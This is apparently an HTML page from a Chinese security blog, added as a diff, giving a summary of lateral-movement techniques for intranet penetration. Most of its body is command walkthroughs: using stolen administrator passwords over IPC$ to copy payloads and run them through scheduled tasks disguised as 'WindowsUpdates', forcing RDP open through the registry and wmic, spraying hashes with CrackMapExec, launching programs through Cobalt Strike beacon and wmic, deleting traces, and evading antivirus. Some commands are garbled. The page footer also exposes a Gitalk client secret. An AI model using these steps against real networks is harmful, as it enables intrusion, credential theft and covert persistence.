@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                内网渗透：  横向渗透方法总结
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-10-12</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">9.6
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">2244</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/Qt3VXtj3c/">内网渗透</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h1 id="内网渗透-横向渗透方法总结">内网渗透： 横向渗透方法总结</h1>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200926082605.png" alt="1" loading="lazy"></figure>
+<h2 id="0x01-基本横向方法">0x01 基本横向方法：</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">横向方法</th>
+<th style="text-align:center">实现方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">远程计划任务，远程服务管理</td>
+<td style="text-align:center">$IPC远程操作实现目标上线</td>
+</tr>
+<tr>
+<td style="text-align:center">Dcom 远程执行</td>
+<td style="text-align:center">通过Com对象进行远程命令执行</td>
+</tr>
+<tr>
+<td style="text-align:center">Rdp 远程执行</td>
+<td style="text-align:center">RDP配合代码执行进行横向渗透</td>
+</tr>
+<tr>
+<td style="text-align:center">SSH 远程执行</td>
+<td style="text-align:center">MSF配合命令执行进行横向渗透</td>
+</tr>
+<tr>
+<td style="text-align:center">Mssql 远程执行</td>
+<td style="text-align:center">MSF配合Hash-dump模块，或者通过存储过程进行命令执行</td>
+</tr>
+<tr>
+<td style="text-align:center">Oracle 远程执行</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Mysql 远程执行</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Post gresql 远程执行</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">集控下发 各类 EDR 主控端 补丁服务器</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SSP</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SSH 类后门 别名记录</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">各类 Java 中间件 RCE Nday <strong>Tomcat,ActiveMQ,Weblogic,Jenkins,shiro,fastjson</strong></td>
+<td style="text-align:center">MSF配合各类中间件利用工具</td>
+</tr>
+<tr>
+<td style="text-align:center">IIS6.0 Webdav RCE &amp; PUT</td>
+<td style="text-align:center">利用中间件漏洞RCE实现横向</td>
+</tr>
+<tr>
+<td style="text-align:center">OWA CVE 2020 0688</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">CVE 2019 0708</td>
+<td style="text-align:center">3389漏洞利用</td>
+</tr>
+<tr>
+<td style="text-align:center">MS17 010</td>
+<td style="text-align:center">永恒之蓝利用</td>
+</tr>
+<tr>
+<td style="text-align:center">MS08 067</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Rsync 写文件</td>
+<td style="text-align:center">通过文件同步</td>
+</tr>
+<tr>
+<td style="text-align:center">NFS 错误配置</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">内网钓鱼 利用内部 邮件 OA 聊天工具 社工 FTP /NAS 挑 文件绑马替换</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">DNS 劫持 挂马 钓鱼</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">Rdp 反向劫持 条件苛刻</td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">通过收集的敏感信息横向</th>
+<th style="text-align:center">实现方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">个人机浏览器 Web 密码 抓取 找上传 传 shell</td>
+<td style="text-align:center">常规WEB渗透，寻找关键系统getshell</td>
+</tr>
+<tr>
+<td style="text-align:center">抓取各类三方工具客户端 [Xshell,SecureCRT,Navicat,SSMS,PLSQL,Filezilla,xftp密码</td>
+<td style="text-align:center">获取敏感信息，进行密码收集，定点横向</td>
+</tr>
+<tr>
+<td style="text-align:center">MS14 068</td>
+<td style="text-align:center">通过漏洞获取域控权限</td>
+</tr>
+<tr>
+<td style="text-align:center">服务票据爆破</td>
+<td style="text-align:center">域内服务暴力破解</td>
+</tr>
+<tr>
+<td style="text-align:center">Ldap 喷射</td>
+<td style="text-align:center">通过工具进行Ldap喷射</td>
+</tr>
+<tr>
+<td style="text-align:center">绑定登录脚本</td>
+<td style="text-align:center">通过域控进行设定登陆脚本</td>
+</tr>
+<tr>
+<td style="text-align:center">EDR下发策略</td>
+<td style="text-align:center">各类高权限的恶意策略下发</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x02-具体实现步骤">0x02 具体实现步骤</h2>
+<h3 id="font-colorred-远程计划任务font"><font color=REd>[+] 远程计划任务</font></h3>
+<p><strong>前提条件：</strong></p>
+<ul>
+<li>1.必须通过其他手段拿到本地或者域管理账号密码</li>
+<li>2.若在横向渗透过程中，要保证当前机器能<code>net use</code>远程到目标机器上</li>
+<li>3.目标机器开启了<code>task scheduler</code>服务,正常运行<code>Task Scheduler</code></li>
+</ul>
+<p><strong>具体步骤：</strong></p>
+<ul>
+<li><strong>XP/2003以下版本利用方式</strong></li>
+</ul>
+<pre><code class="language-cmd">net use \\10.10.10.10\admin$ /user:&quot;administrator&quot; !QAZ2wsx # net use
+
+net time 10.10.10.10 # 查看 远程 windows 机器时间
+
+xcopy Patches.exe 192.168.3.102 admin$ temp # 把 payload拷到远程机器的某个临时目录下
+
+at 192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 windows temp Patches.exe # 开始在 远程 机器 上创建计划任务 只 在 每个月 的这几天的晚上七点半 准时 执行 指定 的 payload
+
+at 192.168.3.102 # 查看 远程机器上的 所有 计划任务 列表
+
+at 192.168.3.102 /delete /yes # 删除 远程机器上的所有计划任务 也可以 用 指定 id 的 方式 删除 单条 计划任务
+
+net use 192.168.3.102 admin$ /del # 用完 以后 立即 删除 该 ipc 连接
+</code></pre>
+<ol>
+<li>通过IPC共享木马文件，先查看目标时间：</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200925164637.png" alt="image-20200925164637769" loading="lazy"></figure>
+<ul>
+<li><strong>Windows 7/windows 2003 以上</strong></li>
+</ul>
+<p>具体操作流程</p>
+<pre><code class="language-cmd">net use \\192.168.3.108\admin$ /user:&quot;administrator&quot; &quot;admin!@#45&quot;
+
+net time \\192.168.3.108
+
+xcopy c:\rev.bat \\192.168.3.108\admin$\temp\
+
+chcp 437 # 如果目标是中文系统,最好先调整下字符集,不然会有问题
+
+schtasks /create /s 192.168.3.108 /u &quot;administrator&quot; /p &quot;admin!@#45&quot; /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/bit.exe&quot; /sc DAILY /mo 1 /ST 20:15
+#在远程的目标机器上创建计划任务
+
+schtasks /run /tn WindowsUpdates /s 192.168.3.108 /U &quot; administrator&quot; /P &quot;admin!@#45&quot; # 创建完以后,远程手动运行
+
+schtasks /query /s 192.168.3.108 /U &quot;administrator&quot; /P &quot;admin!@#45&quot; | findstr &quot;WindowsUpdates&quot; # 运行完以后,随手检查运行状态
+
+schtasks /delete /F /tn WindowsUpdates /s 192.168.3.108 /U &quot; administrator&quot; /P &quot;admin!@#45&quot; # 一般情况下,在我们拿到远程机器shell 以后,立即删除远程机器上的计划任务即可
+
+</code></pre>
+<h3 id="font-colorred-dcom-远程执行font"><font color=REd>[+] Dcom 远程执行</font></h3>
+<p><strong>前提条件：</strong></p>
+<ul>
+<li>1.必须拥有管理员权限，目标机开启共享且关闭防火墙</li>
+<li>2.若在域内环境横向渗透过程中，要保证当前机器获取了域管理员证书</li>
+</ul>
+<p><strong>具体步骤：</strong></p>
+<h3 id="font-colorred-rdp-横向渗透font"><font color=REd>[+] RDP 横向渗透</font></h3>
+<p><strong>前提条件：</strong></p>
+<ul>
+<li>1.在拿下一台机器后，Dump-Hash之后得到明文密码，结合本机信息猜测其他机器密码，进行横向（动静较大）</li>
+<li>2.拥有管理员权限或者RDP组权限</li>
+<li>3.通过RDP成功连接时，执行程序实现横向渗透</li>
+</ul>
+<p><strong>具体步骤：</strong></p>
+<h4 id="1密码规则猜测或者弱口令直接撞3389工作组环境">（1）密码规则猜测，或者弱口令直接撞3389（工作组环境）</h4>
+<ul>
+<li>假设拿到<strong>DMZ</strong>区域的WEB服务器,DumpHash后，获得密码格式</li>
+</ul>
+<pre><code class="language-cmd"># IP： 10.10.10.130   密码： ABCD130!@.
+
+# 仔细划分为三部分：
+
+# ABCD  目标公司名称简称 
+
+# 130	目标系统IP的C段地址
+
+# !@.	密码策略问题，加的特殊字符
+
+# 由此可以猜测主机内其他机器管理员密码情况，从而定点横向，从WEB到数据库从数据库到核心。。。。
+
+</code></pre>
+<h4 id="2-通过高权限用户配合高密码进行横向rdp喷射">（2） 通过高权限用户配合高密码进行横向RDP喷射</h4>
+<ul>
+<li>
+<p>高权限域用户，Dump到明文密码，3389端口开启：</p>
+<ul>
+<li>RDP端口查看方式：</li>
+</ul>
+<pre><code class="language-powershell"># 通过注册表查询3389
+
+REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections # 查看RDP服务是否开启：1关闭，0开启
+
+REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber  # 查看RDP服务的端口
+
+
+# 通过进程查看
+
+tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID
+netstat -ano | find &quot;3220&quot; # 找到进程对应的端口号
+
+
+# 通过监听端口查看
+
+netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端口更改
+
+</code></pre>
+<ul>
+<li>
+<p>强开RDP端口方法:</p>
+<pre><code class="language-powershell"># 注册表开启，高权限用户：
+
+REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f  # 监听 3389 端口
+
+# 注册表文件开启，高权限用户：
+
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+&quot;fDenyTSConnections&quot;=dword:00000000
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
+&quot;PortNumber&quot;=dword:00000d3d 
+
+# Wmic启动远程主机RDP服务：
+
+wmic /node: &quot;10.10.10.130&quot; /USER:&quot;10.10.10.130\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 # 需要输入远程机器上管理员密码
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>后续通过一些RDP爆破工具，进行爆破，前提是已经进行过<code>3389</code>端口的扫描得到结构,以免动静太大，效率太低！</p>
+</li>
+</ul>
+<h3 id="font-colorred-smb-横向渗透font"><font color=REd>[+] SMB 横向渗透</font></h3>
+<p><strong>前提条件：</strong></p>
+<ul>
+<li>1.获取到目标机器的明文密码/NTLM-Hash</li>
+<li>2.若在工作组内进行<code>SMB</code>的爆破，目标机器开启445端口，开启admin目录共享，以及<code>密码正确</code></li>
+</ul>
+<p><strong>常用方法：</strong></p>
+<ul>
+<li>1.基础的手动进行IPC连接，实现横向</li>
+<li>2.通过msf自带的<code>psexec</code> 模块进行横向</li>
+<li>3.通过<code>CrackMapexec</code>进行横向渗透</li>
+<li>4.通过计划任务进行<code>smb</code>的爆破，实现横向渗透</li>
+<li>5.目标开启<code>135</code>端口，通过<code>WMI</code>进行命令执行，实现横向</li>
+<li>6.通过powershll脚本实现PTH,进行横向渗透</li>
+</ul>
+<p><strong>基本步骤：</strong></p>
+<p><strong>工具地址：</strong></p>
+<p>https://github.com/maaaaz/CrackMapExecWin</p>
+<p>https://github.com/byt3bl33d3r/CrackMapExec</p>
+<p>以<code>CrackMapExec</code>为例,通常情况下，有Python版本的编译的exe版本，实战时要修改特征，如果要落地到目标机器，注意免杀！例子：工作组环境下的利用：</p>
+<ol>
+<li>首先先通过手中的机器,dump到Hash或者明文密码，为了效率问题，针对已知网段的<code>445</code>端口进行探测，保存结果：</li>
+</ol>
+<pre><code class="language-cmd">crackmapexec.exe -d . -t 10 172.16.0.0/16
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/20210204104949.png" alt="image-20210204104949552" loading="lazy"></figure>
+<ol start="2">
+<li>探测后的结果，通过手中的密码/Hash去撞一下机器,顺便获取登陆成功后的机器的Hash，为后续做准备：</li>
+</ol>
+<pre><code class="language-cmd">for /f &quot;delims=&quot; %i in (C:\windows\temp\ip.txt) do @crackmapexec.exe -d . -u administrator -p ！QAZ@WSX 1 --sam %
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/20210204110045.png" alt="image-20210204110045733" loading="lazy"></figure>
+<ol start="3">
+<li>筛选Hash后续进行，第二次传递，实战中可以通过计划任务，配合免杀的MimiKatz进行抓取明文密码：</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/20210204110123.png" alt="image-20201213180319606" loading="lazy"></figure>
+<h3 id="font-colorred-smb-横向渗透font-2"><font color=REd>[+] SMB 横向渗透</font></h3>
+<h4 id="基于wmic的横向渗透目标防火墙关闭开启135端口">基于wmic的横向渗透，目标防火墙关闭，开启135端口</h4>
+<pre><code>beacon&gt;shell net use N10.7.6.30\admin$ /user:&quot;administrator&quot;&quot;xxxx@1234&quot;
+beacon&gt;shell copy SysDebug.exe N10.7.6.30ladminS\debug\
+beacon&gt;shell wmic/NODE:&quot;10.7.6.30&quot;/user:&quot;administrator&quot;/password:&quot;xxxx@1234&quot; PROCESS
+call create&quot;c:\windows\debug\SysDebug.exe&quot;
+beacon&gt;shell del \10.7.5.25\admin$\debug\SysDebug.exe/F
+beacon&gt;shell net use\10.7.6.30ladmin$/del
+</code></pre>
+<h4 id="smb碰撞">SMB碰撞</h4>
+<pre><code>shell for/f &quot;delims=&quot; %i in(D:/用户文档/yanc/Contacts/all.txt)do SysLog.exe-h%i
+user.txt pwd.txt&gt;&gt;sys.logs
+</code></pre>
+<h4 id="基于ipc的横向渗透目标445端口开放">基于IPC的横向渗透，目标445端口开放：</h4>
+<pre><code>beacon&gt;shell net use \\10.ip.ip.ip\admin$ /user:&quot;administrator&quot; &quot;password&quot;
+beacon&gt;shell copy debug.exe \\10.ip.ip.ip\admin$\debug\
+beacon&gt;shell wmic /NODE:&quot;10.ip.ip.ip&quot; /user:&quot;administrator&quot; /password:&quot;passsword&quot; PROCESS call create &quot;c:\windows\debug\debug.exe&quot;
+</code></pre>
+<pre><code>beacon&gt;shell del \\10.ip.ip.ip\admin$\debug\debug.exe /F
+beacon&gt;shell net use \\10.ip.ip.ip\admin$ /del
+</code></pre>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/Net-6/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/Net-6/&sharesource=qzone&title=内网渗透：  横向渗透方法总结&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/Net-6/&sharesource=weibo&title=内网渗透：  横向渗透方法总结 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/Qt3VXtj3c/">#
+                    内网渗透
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/RealCode-01/">
+                                                                                            代码审计: 某Thinkphp系统审计
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/Net-5/">
+                                                                                                    内网渗透： 域认证Kerberos协议分析记录
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
